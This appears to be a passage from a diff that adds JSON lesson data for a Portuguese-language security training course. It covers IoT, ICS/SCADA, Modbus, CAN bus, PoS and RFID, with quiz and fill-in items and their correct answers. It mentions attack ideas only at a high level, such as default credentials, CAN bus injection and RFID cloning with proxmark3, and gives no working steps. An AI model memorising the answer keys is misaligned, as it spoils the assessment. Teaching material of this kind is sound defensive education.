+            "definition": "Pub/sub leve (sem auth comum)"
+          },
+          {
+            "term": "CoAP",
+            "definition": "HTTP para IoT (UDP)"
+          },
+          {
+            "term": "Zigbee",
+            "definition": "Mesh de curto alcance"
+          },
+          {
+            "term": "LoRaWAN",
+            "definition": "Longo alcance e baixo consumo"
+          }
+        ]
+      },
+      {
+        "type": "fill",
+        "sentence": "Uma das vulnerabilidades mais exploradas em roteadores e câmeras IoT é o uso de ___ e senhas padrão de fábrica que nunca são alteradas.",
+        "options": [
+          "credenciais default",
+          "certificados SSH",
+          "chaves PGP"
+        ],
+        "correctText": "credenciais default",
+        "explanation": "A maioria dos ataques IoT tenta 'admin/admin' ou senhas similares de fábrica."
+      }
+    ]
+  },
+  {
+    "filename": "7.2b-ics-scada-embedded.html",
+    "module": "7",
+    "title": "ICS/SCADA, Embarcados e Especializados 7.2b",
+    "victory_msg": "ICS/SCADA & EMBARCADOS DOMINADOS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-industry",
+        "title": "ICS e SCADA (Tecnologia Operacional)",
+        "content": "Sistemas <b>ICS</b> (Industrial Control Systems) e <b>SCADA</b> controlam infraestrutura crítica (água, energia). Uma invasão em ambientes de <b>OT (Operational Technology)</b> causa danos físicos no mundo real (ex: Stuxnet).",
+        "highlight": "No mundo OT, segurança significa segurança FÍSICA e continuidade."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-plug",
+        "title": "PLCs e Protocolos OT",
+        "content": "Máquinas são controladas por <b>PLCs</b> (Programmable Logic Controllers). Protocolos industriais clássicos como <b>Modbus</b> e <b>DNP3</b> foram criados sem criptografia ou autenticação, confiando no isolamento da rede (Air Gap).",
+        "highlight": "Modbus envia comandos industriais em texto claro."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual protocolo é amplamente utilizado em sistemas industriais (SCADA/ICS) para comunicação entre PLCs, mas não possui criptografia ou autenticação nativa?",
+        "options": [
+          "Modbus",
+          "HTTPS",
+          "SSH"
+        ],
+        "correctText": "Modbus",
+        "explanation": "Modbus é um protocolo antigo (1979) e não seguro por padrão, sendo muito visado em ataques OT."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-car",
+        "title": "Sistemas Embarcados e CAN Bus",
+        "content": "Veículos modernos usam o protocolo <b>CAN bus</b> para comunicação interna (freios, direção). Injeção de mensagens no CAN bus (ex: OBD-II port) permite assumir controle do carro.",
+        "highlight": "CAN bus não tem autenticação de origem."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-credit-card",
+        "title": "PoS, RFID e NFC",
+        "content": "Sistemas de Ponto de Venda (<b>PoS</b>) são alvos de RAM scrapers (roubo de cartões). Tecnologias de rádio como <b>RFID</b> (crachás) e <b>NFC</b> podem ser clonadas usando proxmark3 ou interceptadas de perto.",
+        "highlight": "Clonagem de RFID abre portas físicas no pentest."
+      },
+      {
+        "type": "match",
+        "title": "Tecnologia → Aplicação",
+        "pairs": [
+          {
+            "term": "SCADA",
+            "definition": "Controle industrial (energia/água)"
+          },
+          {
+            "term": "CAN bus",
+            "definition": "Comunicação veicular (carros)"
+          },
+          {
+            "term": "RFID",
+            "definition": "Controle de acesso físico (crachás)"
+          },
+          {
+            "term": "PoS",
+            "definition": "Ponto de Venda (caixas de loja)"
+          }
+        ]
+      },
+      {
+        "type": "fill",
+        "sentence": "O isolamento total de uma rede OT (Industrial) da Internet e de outras redes é chamado de ___.",
+        "options": [
+          "Air Gap",
+          "Firewall",
+          "Sandboxing"
+        ],
+        "correctText": "Air Gap",
+        "explanation": "O 'Air Gap' é uma barreira física de rede, frequentemente violada por pendrives (ex: Stuxnet)."
+      }
+    ]
+  }
+]
